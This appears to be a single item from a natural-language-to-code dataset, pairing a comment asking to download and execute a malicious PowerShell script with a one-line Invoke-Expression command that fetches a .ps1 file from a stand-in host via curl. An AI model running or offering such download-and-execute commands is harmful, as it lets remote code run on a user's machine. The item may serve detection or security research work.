# Natural language intent:
# Invoke a command to download and execute a malicious PowerShell script using curl.

Invoke-Expression -Command "& {curl http://malicious.example.com/malicious.ps1}"
